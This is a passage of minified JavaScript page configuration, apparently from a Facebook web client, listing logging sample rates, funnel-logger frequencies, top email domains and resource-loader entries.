                        "733095886": {sampleRate: 1, samplingMethod: 1},
                        "738133175": {sampleRate: 10000, samplingMethod: 1},
                        "738142835": {sampleRate: 10000, samplingMethod: 1},
                        "742524264": {sampleRate: 1, samplingMethod: 1},
                        "742525195": {sampleRate: 1, samplingMethod: 1},
                        "742525508": {sampleRate: 1, samplingMethod: 1},
                        "742528755": {sampleRate: 1, samplingMethod: 1},
                        "742528977": {sampleRate: 1, samplingMethod: 1},
                        "742531496": {sampleRate: 1, samplingMethod: 1},
                        "742535026": {sampleRate: 1, samplingMethod: 1},
                        "742535799": {sampleRate: 1, samplingMethod: 1},
                        "742535803": {sampleRate: 1, samplingMethod: 1},
                        "744037991": {sampleRate: 1, samplingMethod: 1},
                        "744044661": {sampleRate: 1, samplingMethod: 1},
                        "747445299": {sampleRate: 1, samplingMethod: 1},
                        "747454106": {sampleRate: 1, samplingMethod: 1},
                        "755959842": {sampleRate: 1, samplingMethod: 1},
                        "755965148": {sampleRate: 1, samplingMethod: 1},
                        "755968561": {sampleRate: 1, samplingMethod: 1},
                        "759373195": {sampleRate: 1, samplingMethod: 3},
                        "759564472": {sampleRate: 1, samplingMethod: 1},
                        "759566636": {sampleRate: 1, samplingMethod: 1},
                        "759576445": {sampleRate: 1, samplingMethod: 1},
                        "767301815": {sampleRate: 10000, samplingMethod: 1},
                        "777060353": {sampleRate: 10000, samplingMethod: 1},
                        "777330614": {sampleRate: 1, samplingMethod: 1},
                        "777338387": {sampleRate: 1, samplingMethod: 1},
                        "777977857": {sampleRate: 10000, samplingMethod: 1},
                        "777977858": {sampleRate: 10000, samplingMethod: 1},
                        "778897115": {sampleRate: 1, samplingMethod: 1},
                        "778910749": {sampleRate: 1, samplingMethod: 1},
                        "779749791": {sampleRate: 1, samplingMethod: 1},
                        "779762281": {sampleRate: 1, samplingMethod: 1},
                        "780212905": {sampleRate: 1, samplingMethod: 1},
                        "782907314": {sampleRate: 1, samplingMethod: 1},
                        "782908389": {sampleRate: 1, samplingMethod: 1},
                        "788144639": {sampleRate: 1, samplingMethod: 1},
                        "789446657": {sampleRate: 1, samplingMethod: 1},
                        "789450742": {sampleRate: 1, samplingMethod: 1},
                        "790891628": {sampleRate: 100, samplingMethod: 1},
                        "790898449": {sampleRate: 100, samplingMethod: 1},
                        "790901695": {sampleRate: 100, samplingMethod: 1},
                        "801442060": {sampleRate: 100, samplingMethod: 1},
                        "801443888": {sampleRate: 1, samplingMethod: 1},
                        "801449188": {sampleRate: 1, samplingMethod: 1},
                        "801454903": {sampleRate: 1, samplingMethod: 1},
                        "801455226": {sampleRate: 1, samplingMethod: 1},
                        "806238920": {sampleRate: 1, samplingMethod: 1},
                        "810488499": {sampleRate: 100, samplingMethod: 1},
                        "810490227": {sampleRate: 10000, samplingMethod: 1},
                        "810490283": {sampleRate: 100, samplingMethod: 1},
                        "810491575": {sampleRate: 10000, samplingMethod: 1},
                        "810492450": {sampleRate: 10000, samplingMethod: 1},
                        "810497509": {sampleRate: 10000, samplingMethod: 1},
                        "810497709": {sampleRate: 100, samplingMethod: 1},
                        "810498220": {sampleRate: 10000, samplingMethod: 1},
                        "819201633": {sampleRate: 1, samplingMethod: 1},
                        "819206995": {sampleRate: 1, samplingMethod: 1},
                        "823333654": {sampleRate: 100, samplingMethod: 1},
                        "825425921": {sampleRate: 1, samplingMethod: 1},
                        "825433348": {sampleRate: 1, samplingMethod: 1},
                        "835064883": {sampleRate: 1, samplingMethod: 3},
                        "835068505": {sampleRate: 1, samplingMethod: 3},
                        "835069323": {sampleRate: 1, samplingMethod: 3},
                        "835075303": {sampleRate: 1, samplingMethod: 3},
                        "841618442": {sampleRate: 1, samplingMethod: 1},
                        "841622832": {sampleRate: 1, samplingMethod: 1},
                        "841627612": {sampleRate: 1, samplingMethod: 1},
                        "846476042": {sampleRate: 10000, samplingMethod: 1},
                        "849416660": {sampleRate: 1, samplingMethod: 1},
                        "849416900": {sampleRate: 1, samplingMethod: 1},
                        "849418188": {sampleRate: 1, samplingMethod: 1},
                        "849419603": {sampleRate: 1, samplingMethod: 1},
                        "849419641": {sampleRate: 1, samplingMethod: 1},
                        "849421651": {sampleRate: 1, samplingMethod: 1},
                        "849422375": {sampleRate: 1, samplingMethod: 1},
                        "849422997": {sampleRate: 1, samplingMethod: 1},
                        "864882179": {sampleRate: 1, samplingMethod: 1},
                        "864882964": {sampleRate: 10000, samplingMethod: 1},
                        "864886206": {sampleRate: 1, samplingMethod: 1},
                        "864887867": {sampleRate: 10000, samplingMethod: 1},
                        "864888473": {sampleRate: 10000, samplingMethod: 1},
                        "864888531": {sampleRate: 10000, samplingMethod: 1},
                        "864888990": {sampleRate: 10000, samplingMethod: 1},
                        "864889698": {sampleRate: 10000, samplingMethod: 1},
                        "864889839": {sampleRate: 1, samplingMethod: 1},
                        "864891596": {sampleRate: 10000, samplingMethod: 1},
                        "864892947": {sampleRate: 10000, samplingMethod: 1},
                        "864894344": {sampleRate: 10000, samplingMethod: 1},
                        "866649736": {sampleRate: 1, samplingMethod: 1},
                        "866650326": {sampleRate: 1, samplingMethod: 1},
                        "866650701": {sampleRate: 1, samplingMethod: 1},
                        "866652534": {sampleRate: 1, samplingMethod: 1},
                        "866653173": {sampleRate: 1, samplingMethod: 1},
                        "866653743": {sampleRate: 1, samplingMethod: 1},
                        "866653977": {sampleRate: 1, samplingMethod: 1},
                        "866654711": {sampleRate: 1, samplingMethod: 1},
                        "866655634": {sampleRate: 1, samplingMethod: 1},
                        "866657326": {sampleRate: 1, samplingMethod: 1},
                        "866663933": {sampleRate: 1, samplingMethod: 1},
                        "868220929": {sampleRate: 1, samplingMethod: 1},
                        "868222401": {sampleRate: 1, samplingMethod: 1},
                        "869731149": {sampleRate: 10, samplingMethod: 1},
                        "876877572": {sampleRate: 1, samplingMethod: 1},
                        "876877588": {sampleRate: 1, samplingMethod: 1},
                        "876878048": {sampleRate: 1, samplingMethod: 1},
                        "876878791": {sampleRate: 1, samplingMethod: 1},
                        "876879076": {sampleRate: 1, samplingMethod: 1},
                        "876881256": {sampleRate: 1, samplingMethod: 1},
                        "886114753": {sampleRate: 1, samplingMethod: 1},
                        "886116533": {sampleRate: 1, samplingMethod: 1},
                        "890439053": {sampleRate: 1, samplingMethod: 1},
                        "890442675": {sampleRate: 1, samplingMethod: 1},
                        "891686230": {sampleRate: 1, samplingMethod: 3},
                        "892211987": {sampleRate: 10000, samplingMethod: 1},
                        "892215753": {sampleRate: 1, samplingMethod: 3},
                        "893386753": {sampleRate: 10000, samplingMethod: 1},
                        "896140808": {sampleRate: 100, samplingMethod: 1},
                        "896147113": {sampleRate: 100, samplingMethod: 1},
                        "896148353": {sampleRate: 20000, samplingMethod: 1},
                        "896149667": {sampleRate: 1, samplingMethod: 1},
                        "899355574": {sampleRate: 10, samplingMethod: 1},
                        "901855609": {sampleRate: 1, samplingMethod: 1},
                        "916591346": {sampleRate: 10000, samplingMethod: 1},
                        "916594868": {sampleRate: 10000, samplingMethod: 1},
                        "916596786": {sampleRate: 10000, samplingMethod: 1},
                        "916599023": {sampleRate: 10000, samplingMethod: 1},
                        "916602249": {sampleRate: 10000, samplingMethod: 1},
                        "918820258": {sampleRate: 1, samplingMethod: 1},
                        "918825252": {sampleRate: 1, samplingMethod: 1},
                        "919603227": {sampleRate: 100, samplingMethod: 1},
                        "919603854": {sampleRate: 10000, samplingMethod: 1},
                        "919604299": {sampleRate: 100, samplingMethod: 1},
                        "919604703": {sampleRate: 100, samplingMethod: 1},
                        "919609721": {sampleRate: 100, samplingMethod: 1},
                        "919614523": {sampleRate: 10000, samplingMethod: 1},
                        "919623711": {sampleRate: 10000, samplingMethod: 1},
                        "931594241": {sampleRate: 1, samplingMethod: 1},
                        "932906418": {sampleRate: 1, samplingMethod: 1},
                        "932909142": {sampleRate: 10000, samplingMethod: 1},
                        "932909377": {sampleRate: 1, samplingMethod: 1},
                        "932909931": {sampleRate: 1, samplingMethod: 1},
                        "932910147": {sampleRate: 1, samplingMethod: 1},
                        "932910200": {sampleRate: 10000, samplingMethod: 1},
                        "932912792": {sampleRate: 10000, samplingMethod: 1},
                        "932912954": {sampleRate: 10000, samplingMethod: 1},
                        "932913600": {sampleRate: 10000, samplingMethod: 1},
                        "932913663": {sampleRate: 10000, samplingMethod: 1},
                        "932914460": {sampleRate: 10000, samplingMethod: 1},
                        "932915806": {sampleRate: 1, samplingMethod: 1},
                        "932915999": {sampleRate: 1, samplingMethod: 1},
                        "932916075": {sampleRate: 10000, samplingMethod: 1},
                        "932917888": {sampleRate: 10000, samplingMethod: 1},
                        "932918244": {sampleRate: 1, samplingMethod: 1},
                        "932918590": {sampleRate: 10000, samplingMethod: 1},
                        "932920974": {sampleRate: 10000, samplingMethod: 1},
                        "941884436": {sampleRate: 1, samplingMethod: 1},
                        "941884476": {sampleRate: 1, samplingMethod: 1},
                        "941884689": {sampleRate: 1, samplingMethod: 1},
                        "941884838": {sampleRate: 1, samplingMethod: 1},
                        "941884945": {sampleRate: 1, samplingMethod: 1},
                        "941885000": {sampleRate: 1, samplingMethod: 1},
                        "941885017": {sampleRate: 1, samplingMethod: 1},
                        "941885024": {sampleRate: 1, samplingMethod: 1},
                        "941885056": {sampleRate: 1, samplingMethod: 1},
                        "941885063": {sampleRate: 1, samplingMethod: 1},
                        "941885196": {sampleRate: 1, samplingMethod: 1},
                        "941885540": {sampleRate: 1, samplingMethod: 1},
                        "941885615": {sampleRate: 1, samplingMethod: 1},
                        "941886063": {sampleRate: 1, samplingMethod: 1},
                        "941886114": {sampleRate: 1, samplingMethod: 1},
                        "941886177": {sampleRate: 1, samplingMethod: 1},
                        "941886197": {sampleRate: 1, samplingMethod: 1},
                        "941886335": {sampleRate: 1, samplingMethod: 1},
                        "941886520": {sampleRate: 1, samplingMethod: 1},
                        "941886698": {sampleRate: 1, samplingMethod: 1},
                        "941886823": {sampleRate: 1, samplingMethod: 1},
                        "941886887": {sampleRate: 1, samplingMethod: 1},
                        "941886907": {sampleRate: 1, samplingMethod: 1},
                        "941887006": {sampleRate: 1, samplingMethod: 1},
                        "941887370": {sampleRate: 1, samplingMethod: 1},
                        "941887457": {sampleRate: 1, samplingMethod: 1},
                        "941887775": {sampleRate: 1, samplingMethod: 1},
                        "941887999": {sampleRate: 1, samplingMethod: 1},
                        "941888108": {sampleRate: 1, samplingMethod: 1},
                        "941888170": {sampleRate: 1, samplingMethod: 1},
                        "941888329": {sampleRate: 1, samplingMethod: 1},
                        "941888344": {sampleRate: 1, samplingMethod: 1},
                        "941888609": {sampleRate: 1, samplingMethod: 1},
                        "941888741": {sampleRate: 1, samplingMethod: 1},
                        "941888850": {sampleRate: 1, samplingMethod: 1},
                        "941889079": {sampleRate: 1, samplingMethod: 1},
                        "941889130": {sampleRate: 1, samplingMethod: 1},
                        "941889500": {sampleRate: 1, samplingMethod: 1},
                        "941889635": {sampleRate: 1, samplingMethod: 1},
                        "941889736": {sampleRate: 1, samplingMethod: 1},
                        "941889793": {sampleRate: 1, samplingMethod: 1},
                        "941889802": {sampleRate: 1, samplingMethod: 1},
                        "941889924": {sampleRate: 1, samplingMethod: 1},
                        "941890036": {sampleRate: 1, samplingMethod: 1},
                        "941890649": {sampleRate: 1, samplingMethod: 1},
                        "941890651": {sampleRate: 1, samplingMethod: 1},
                        "941891046": {sampleRate: 1, samplingMethod: 1},
                        "941891372": {sampleRate: 1, samplingMethod: 1},
                        "941891950": {sampleRate: 1, samplingMethod: 1},
                        "941892014": {sampleRate: 1, samplingMethod: 1},
                        "941892105": {sampleRate: 1, samplingMethod: 1},
                        "941892322": {sampleRate: 1, samplingMethod: 1},
                        "941892335": {sampleRate: 1, samplingMethod: 1},
                        "941892412": {sampleRate: 1, samplingMethod: 1},
                        "941892429": {sampleRate: 1, samplingMethod: 1},
                        "941892571": {sampleRate: 1, samplingMethod: 1},
                        "941892660": {sampleRate: 1, samplingMethod: 1},
                        "941892702": {sampleRate: 1, samplingMethod: 1},
                        "941892727": {sampleRate: 1, samplingMethod: 1},
                        "941893098": {sampleRate: 1, samplingMethod: 1},
                        "941893166": {sampleRate: 1, samplingMethod: 1},
                        "941893219": {sampleRate: 1, samplingMethod: 1},
                        "941893296": {sampleRate: 1, samplingMethod: 1},
                        "941893436": {sampleRate: 1, samplingMethod: 1},
                        "941893492": {sampleRate: 1, samplingMethod: 1},
                        "941893543": {sampleRate: 1, samplingMethod: 1},
                        "941893606": {sampleRate: 1, samplingMethod: 1},
                        "941893723": {sampleRate: 1, samplingMethod: 1},
                        "941893915": {sampleRate: 1, samplingMethod: 1},
                        "941894402": {sampleRate: 1, samplingMethod: 1},
                        "941894611": {sampleRate: 1, samplingMethod: 1},
                        "941894849": {sampleRate: 1, samplingMethod: 1},
                        "941894918": {sampleRate: 1, samplingMethod: 1},
                        "941894957": {sampleRate: 1, samplingMethod: 1},
                        "941895078": {sampleRate: 1, samplingMethod: 1},
                        "941895125": {sampleRate: 1, samplingMethod: 1},
                        "941895130": {sampleRate: 1, samplingMethod: 1},
                        "941895169": {sampleRate: 1, samplingMethod: 1},
                        "941895479": {sampleRate: 1, samplingMethod: 1},
                        "941895531": {sampleRate: 1, samplingMethod: 1},
                        "941895641": {sampleRate: 1, samplingMethod: 1},
                        "941895975": {sampleRate: 1, samplingMethod: 1},
                        "941896048": {sampleRate: 1, samplingMethod: 1},
                        "941896080": {sampleRate: 1, samplingMethod: 1},
                        "941896375": {sampleRate: 1, samplingMethod: 1},
                        "941896499": {sampleRate: 1, samplingMethod: 1},
                        "941896590": {sampleRate: 1, samplingMethod: 1},
                        "941896705": {sampleRate: 1, samplingMethod: 1},
                        "941896715": {sampleRate: 1, samplingMethod: 1},
                        "941896722": {sampleRate: 1, samplingMethod: 1},
                        "941896872": {sampleRate: 1, samplingMethod: 1},
                        "941897039": {sampleRate: 1, samplingMethod: 1},
                        "941897301": {sampleRate: 1, samplingMethod: 1},
                        "941897383": {sampleRate: 1, samplingMethod: 1},
                        "941897516": {sampleRate: 1, samplingMethod: 1},
                        "941897846": {sampleRate: 1, samplingMethod: 1},
                        "941898160": {sampleRate: 1, samplingMethod: 1},
                        "941898442": {sampleRate: 1, samplingMethod: 1},
                        "941898452": {sampleRate: 1, samplingMethod: 1},
                        "941898873": {sampleRate: 1, samplingMethod: 1},
                        "941898874": {sampleRate: 1, samplingMethod: 1},
                        "941899083": {sampleRate: 1, samplingMethod: 1},
                        "941899192": {sampleRate: 1, samplingMethod: 1},
                        "941899484": {sampleRate: 1, samplingMethod: 1},
                        "949157888": {sampleRate: 100, samplingMethod: 1},
                        "958136321": {sampleRate: 1, samplingMethod: 1},
                        "959716438": {sampleRate: 10000, samplingMethod: 1},
                        "959719071": {sampleRate: 10000, samplingMethod: 1},
                        "959721070": {sampleRate: 10000, samplingMethod: 1},
                        "960890150": {sampleRate: 1, samplingMethod: 1},
                        "960893339": {sampleRate: 1, samplingMethod: 1},
                        "960894018": {sampleRate: 1, samplingMethod: 1},
                        "960898403": {sampleRate: 1, samplingMethod: 1},
                        "960899916": {sampleRate: 1, samplingMethod: 1},
                        "974004284": {sampleRate: 1, samplingMethod: 1},
                        "981407973": {sampleRate: 1, samplingMethod: 1},
                        "987104250": {sampleRate: 1, samplingMethod: 1},
                        "987105325": {sampleRate: 1, samplingMethod: 1},
                        "987105778": {sampleRate: 1, samplingMethod: 1},
                        "987107036": {sampleRate: 1, samplingMethod: 1},
                        "987107107": {sampleRate: 1, samplingMethod: 1},
                        "987107859": {sampleRate: 1, samplingMethod: 1},
                        "987109656": {sampleRate: 1, samplingMethod: 1},
                        "987110118": {sampleRate: 1, samplingMethod: 1},
                        "987111426": {sampleRate: 1, samplingMethod: 1},
                        "987112165": {sampleRate: 1, samplingMethod: 1},
                        "987112390": {sampleRate: 1, samplingMethod: 1},
                        "987113824": {sampleRate: 1, samplingMethod: 1},
                        "987115291": {sampleRate: 1, samplingMethod: 1},
                        "987115605": {sampleRate: 1, samplingMethod: 1},
                        "987115762": {sampleRate: 1, samplingMethod: 1},
                        "1001586691": {sampleRate: 10000, samplingMethod: 1},
                        "1003294845": {sampleRate: 10000, samplingMethod: 1},
                        "1019346945": {sampleRate: 1, samplingMethod: 1},
                        "1021183069": {sampleRate: 1, samplingMethod: 1},
                        "1021188463": {sampleRate: 1, samplingMethod: 1},
                        "1021190935": {sampleRate: 1, samplingMethod: 1},
                        "1023354200": {sampleRate: 1, samplingMethod: 1},
                        "1024065537": {sampleRate: 10000, samplingMethod: 1},
                        "1049298559": {sampleRate: 1, samplingMethod: 1},
                        "1049310946": {sampleRate: 1, samplingMethod: 1},
                        "1050871471": {sampleRate: 10000, samplingMethod: 1},
                        "1050873607": {sampleRate: 10000, samplingMethod: 1},
                        "1050879687": {sampleRate: 10000, samplingMethod: 1},
                        "1050880814": {sampleRate: 10000, samplingMethod: 1},
                        "1054555339": {sampleRate: 1, samplingMethod: 1},
                        "1060121691": {sampleRate: 1, samplingMethod: 1},
                        "1060123723": {sampleRate: 10000, samplingMethod: 1},
                        "1060125691": {sampleRate: 10000, samplingMethod: 1},
                        "1060175873": {sampleRate: 10000, samplingMethod: 1},
                        "1063782141": {sampleRate: 250, samplingMethod: 1},
                        "1063783100": {sampleRate: 250, samplingMethod: 1},
                        "1063783933": {sampleRate: 250, samplingMethod: 1},
                        "1063784266": {sampleRate: 250, samplingMethod: 1},
                        "1063785441": {sampleRate: 250, samplingMethod: 1},
                        "1063785814": {sampleRate: 1, samplingMethod: 3},
                        "1063787301": {sampleRate: 1, samplingMethod: 3},
                        "1063787682": {sampleRate: 1, samplingMethod: 3},
                        "1063789999": {sampleRate: 1, samplingMethod: 3},
                        "1063791930": {sampleRate: 250, samplingMethod: 1},
                        "1063792837": {sampleRate: 250, samplingMethod: 1},
                        "1063793312": {sampleRate: 250, samplingMethod: 1},
                        "1063795002": {sampleRate: 250, samplingMethod: 1},
                        "1063795646": {sampleRate: 250, samplingMethod: 1},
                        "1063796217": {sampleRate: 250, samplingMethod: 1},
                        "1505636832": {sampleRate: 1, samplingMethod: 1}
                    }, killswitch: false
                }, 3504], ["MRegTopDomainsConfig", [], {topEmailDomains: ["gmail.com", "yahoo.com", "sqoai.com", "icloud.com", "yahoo.com.vn"]}, 4220], ["BrowserPaymentHandlerConfig", [], {enabled: false}, 3904], ["BrowserPushPubKey", [], {appServerKey: "BIBn3E_rWTci8Xn6P9Xj3btShT85Wdtne0LtwNUyRQ5XjFNkuTq9j4MPAVLvAFhXrUU1A9UxyxBA7YIOjqDIDHI"}, 4806], ["MTouchableSyntheticClickGK", [], {USE_SYNTHETIC_CLICK: true}, 368], ["FunnelLoggerConfig", [], {
                    freq: {
                        WWW_MESSENGER_VIDEO_CHAT_LINKS_FUNNEL: 1,
                        PIE_MANAGER_HIRING_HUB_FUNNEL: 1,
                        WWW_ESCALATION_TOOLS_NOTIFICATIONS_PAGE_FUNNEL: 1,
                        WWW_ONCALL_VIEW_FUNNEL: 1,
                        WWW_MESSENGER_GROUP_ESCALATION_FUNNEL: 10,
                        WWW_SPATIAL_REACTION_PRODUCTION_FUNNEL: 1,
                        CREATIVE_STUDIO_CREATION_FUNNEL: 1,
                        WWW_CANVAS_AD_CREATION_FUNNEL: 1,
                        WWW_CANVAS_EDITOR_FUNNEL: 1,
                        WWW_LINK_PICKER_DIALOG_FUNNEL: 1,
                        WWW_MEME_PICKER_DIALOG_FUNNEL: 1,
                        WWW_LEAD_GEN_FORM_CREATION_FUNNEL: 1,
                        WWW_LEAD_GEN_FORM_EDITOR_FUNNEL: 1,
                        WWW_LEAD_GEN_DESKTOP_AD_UNIT_FUNNEL: 1,
                        WWW_LEAD_GEN_MSITE_AD_UNIT_FUNNEL: 1,
                        WWW_CAMPFIRE_COMPOSER_UPSELL_FUNNEL: 1,
                        WWW_PMT_FUNNEL: 1,
                        WWW_PULSE_FUNNEL: 1,
                        WWW_ORGTOOL_FUNNEL: 1,
                        WWW_RECRUITING_PRODUCTS_ATTRIBUTION_FUNNEL: 1,
                        WWW_RECRUITING_PRODUCTS_FUNNEL: 1,
                        WWW_RECRUITING_SEARCH_FUNNEL: 1,
                        WWW_RECRUITING_BULK_EMAIL_FUNNEL: 1,
                        WWW_RECRUITING_LEAVE_HANDLER_FUNNEL: 1,
                        WWW_EXAMPLE_FUNNEL: 1,
                        WWW_REACTIONS_BLINGBAR_NUX_FUNNEL: 1,
                        WWW_REACTIONS_NUX_FUNNEL: 1,
                        WWW_COMMENT_REACTIONS_NUX_FUNNEL: 1,
                        WWW_MESSENGER_SHARE_TO_FB_FUNNEL: 10,
                        POLYGLOT_MAIN_FUNNEL: 1,
                        MSITE_EXAMPLE_FUNNEL: 10,
                        WWW_FEED_SHARE_DIALOG_FUNNEL: 100,
                        MSITE_AD_BREAKS_ONBOARDING_FLOW_FUNNEL: 1,
                        MSITE_FEED_ALBUM_CTA_FUNNEL: 10,
                        MSITE_FEED_SHARE_DIALOG_FUNNEL: 100,
                        MSITE_COMMENT_TYPING_FUNNEL: 500,
                        MSITE_HASHTAG_PROMPT_FUNNEL: 1,
                        WWW_SEARCH_AWARENESS_LEARNING_NUX_FUNNEL: 1,
                        WWW_CONSTITUENT_TITLE_UPSELL_FUNNEL: 1,
                        MTOUCH_FEED_MISSED_STORIES_FUNNEL: 10,
                        WWW_UFI_SHARE_LINK_FUNNEL: 1,
                        WWW_CMS_SEARCH_FUNNEL: 1,
                        GAMES_QUICKSILVER_FUNNEL: 1,
                        SOCIAL_SEARCH_CONVERSION_WWW_FUNNEL: 1,
                        SOCIAL_SEARCH_DASHBOARD_WWW_FUNNEL: 1,
                        SRT_USER_FLOW_FUNNEL: 1,
                        MSITE_PPD_FUNNEL: 1,
                        WWW_PAGE_CREATION_FUNNEL: 1,
                        NT_EXAMPLE_FUNNEL: 1,
                        WWW_LIVE_VIEWER_TIPJAR_FUNNEL: 1,
                        FACECAST_BROADCASTER_FUNNEL: 1,
                        WWW_FUNDRAISER_CREATION_FUNNEL: 1,
                        WWW_FUNDRAISER_EDIT_FUNNEL: 1,
                        WWW_OFFERS_SIMPLE_COMPOSE_FUNNEL: 1,
                        QP_TOOL_FUNNEL: 1,
                        WWW_OFFERS_SIMPLE_COMPOSE_POST_LIKE_FUNNEL: 1,
                        COLLEGE_COMMUNITY_NUX_ONBOARDING_FUNNEL: 1,
                        CASUAL_GROUP_PICKER_FUNNEL: 1,
                        TOPICS_TO_FOLLOW_FUNNEL: 1,
                        WWW_MESSENGER_SEARCH_SESSION_FUNNEL: 1,
                        WWW_LIVE_PRODUCER_FUNNEL: 1,
                        FX_PLATFORM_INVITE_JOIN_FUNNEL: 1,
                        CREATIVE_STUDIO_HUB_FUNNEL: 1,
                        WWW_SEE_OFFERS_CTA_NUX_FUNNEL: 1,
                        WWW_ADS_TARGETING_AUDIENCE_MANAGER_FUNNEL: 1,
                        WWW_AD_BREAKS_ONBOARDING_FUNNEL: 1,
                        WWW_AD_BREAK_HOME_ONBOARDING_FUNNEL: 1,
                        WWW_NOTIFS_UP_NEXT_FUNNEL: 10,
                        ADS_VIDEO_CAPTION_FUNNEL: 1,
                        KEYFRAMES_FUNNEL: 500,
                        SEARCH_ADS_WWW_FUNNEL: 1,
                        WWW_ALT_TEXT_COMPOSER_FUNNEL: 1,
                        BUSINESS_PAYMENTS_MERCHANT_ONBOARDING_FUNNEL: 1,
                        MERCHANT_PAYMENTS_MERCHANT_ONBOARDING_FUNNEL: 1,
                        SELLER_EXPERIENCE_ONBOARDING_NEW_FUNNEL: 1,
                        SELLER_EXPERIENCE_PAYOUT_SETUP_NEW_FUNNEL: 1,
                        SELLER_EXPERIENCE_SHOP_MANAGEMENT_FUNNEL: 1,
                        WWW_BUSINESS_CREATION_FUNNEL: 1,
                        WWW_BUSINESS_VERIFICATION_FUNNEL: 1,
                        WWW_APP_REVIEW_BUSINESS_VERIFICATION_FUNNEL: 1,
                        SELLER_EXPERIENCE_MIGRATION_FUNNEL: 1,
                        SELLER_EXPERIENCE_PAYOUT_SETUP_FUNNEL: 1,
                        PAYOUT_ONBOARDING_FUNNEL: 1,
                        SERVICES_INSTANT_BOOKING_SETTINGS_FUNNEL: 1,
                        SERVICES_FB_APPOINTMENTS_CTA_FULL_SETUP_FUNNEL: 1,
                        SERVICES_FB_APPOINTMENTS_CTA_CREATION_FUNNEL: 1,
                        FB_NEO_ONBOARDING_FUNNEL: 1,
                        FB_NEO_FRIENDING_FUNNEL: 1,
                        WWW_MESSENGER_CONTENT_SEARCH_FUNNEL: 1,
                        SEARCH_FUNNEL: 1,
                        SHADOW_SEARCH_FUNNEL: 1,
                        SHADOW_EARLY_END_SEARCH_FUNNEL: 1,
                        UNIDASH_EDIT_WIDGET_FUNNEL: 1,
                        PRIVATE_COMMENT_COMPOSER_FUNNEL: 1,
                        WEB_RTC_SCREEN_SHARING_FUNNEL: 1,
                        CHECKOUT_EXPERIENCES_FUNNEL: 1,
                        CHECKOUT_EXPERIENCES_SELLER_FUNNEL: 1,
                        WWW_SERVICES_INSTANT_BOOKING_CONSUMER_FUNNEL: 1,
                        WWW_SERVICES_BOOK_APPOINTMENT_CONSUMER_FUNNEL: 10,
                        WWW_SPHERICAL_DIRECTOR_FUNNEL: 1,
                        NATIVE_SUPPORT_FUNNEL: 1,
                        WWW_PRESENCE_FUNNEL: 1,
                        MESSENGER_UNIVERSAL_SEARCH_FUNNEL: 1,
                        MESSENGER_SECONDARY_SEARCH_FUNNEL: 1,
                        WORK_CHAT_SEARCH_FUNNEL: 1,
                        PRIVACY_SHORTCUTS_FUNNEL: 1,
                        PRIVACY_ACCESS_HUB_FUNNEL: 1,
                        WWW_POLITICIAN_OFFICE_SETTING_FUNNEL: 1,
                        WWW_CIVIC_ACTION_POST_INVITE_FUNNEL: 1,
                        WWW_MESSENGER_SHARE_FILE_PREVIEW_FUNNEL: 1,
                        ALL_VOICES_FUNNEL: 1,
                        AEC_APPLICATION_FUNNEL: 1,
                        INSTANT_EXPERIENCES_MINDBODY_FUNNEL: 1,
                        WWW_LAUNCHPAD_ONBOARDING_FUNNEL: 1,
                        GIZMO_VCPANEL_CALL_START_FUNNEL: 1,
                        WWW_FB_CHAT_NEW_SETTINGS_MENU_FUNNEL: 1,
                        KAIOS_REG_CONTACT_IMPORTER_FUNNEL: 1,
                        MAP_WEB_FUNNEL: 1,
                        SOCIAL_VR_INTERACTIVE_THREE_SIXTY_FUNNEL: 1,
                        WWW_SNOWLIFT_ACTIONS_FUNNEL: 1,
                        SVC_DEPLOYMENT_ONBOARDING_FUNNEL: 1,
                        FHT_FUNNEL: 1,
                        default: 1000
                    }
                }, 1271], ["MarauderConfig", [], {
                    app_version: "1.0.0.0 (1003848272)",
                    gk_enabled: false
                }, 31], ["cr:1069930", [], {__rc: [null, "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:1083116", ["XAsyncRequest"], {__rc: ["XAsyncRequest", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:1083117", [], {__rc: [null, "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:1367102", [], {__rc: [null, "Aa3k4nSUU8oVn-gfUHLJfm8rKOLnRDUsSBheoYmlp0Ts0TU-mitqezch_R7dyGPmp6RzO39k_XtMnu_KUtwQovPG"]}, -1], ["cr:1697455", ["CookieConsentActionHandler"], {__rc: ["CookieConsentActionHandler", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:1984081", [], {__rc: [null, "Aa348Q580tC-kXsGtjVrtC19KINjL0mdD9bIL9Z4EfJLL4tNLcaCDONrgccYNVAZLz2Ch-dzzuMsFm0RldRPenF13Ttz"]}, -1], ["cr:1088657", [], {__rc: [null, "Aa3sG1DZcHju1_AsTmPvMwYyFcek2D-e6_1ozePVGI65PsfwWkWNE1vGMq52e2-14CrX-Bv2cDhVBOX7U3_IC2I"]}, -1], ["cr:1278084", ["ghlTestUBTFacebook"], {__rc: ["ghlTestUBTFacebook", "Aa0rBdAufoZdiWxD25c3DOgU1SSGV8rdrdbqVIULKhbjEBMLb1sX8CUrK57KESncLqvzvuhnf2c"]}, -1], ["cr:1543261", [], {__rc: [null, "Aa2pQ4ElZJcgBDtwy-Cfyc_VOSP33B_krofLtC_dULwV--PrqKRUk83KnwFSeXESALdxybl9jj_SuyHIDs73hI-t"]}, -1], ["cr:708886", ["EventProfilerImpl"], {__rc: ["EventProfilerImpl", "Aa0UHWfu8NrPr1pBNrgHhHs7FXRN2ioLh1StWXqOXrgnKuaBOud0HQMqG6GFYeR-0SnDIXEiNW4eLgjuKdgMQ-ZQr2c"]}, -1], ["cr:1094907", [], {__rc: [null, "Aa3nPMHPmIZm9HU89l35xpQOjr8Pr4-aVziJNgQzhyy4FeLNxk5rMMnZqVQXJi333JEWXuJCSKEf91QpodTJItA"]}, -1], ["EventConfig", [], {
                    sampling: {
                        bandwidth: 0,
                        play: 0,
                        playing: 0,
                        progress: 0,
                        pause: 0,
                        ended: 0,
                        seeked: 0,
                        seeking: 0,
                        waiting: 0,
                        loadedmetadata: 0,
                        canplay: 0,
                        selectionchange: 0,
                        change: 0,
                        timeupdate: 0,
                        adaptation: 0,
                        focus: 0,
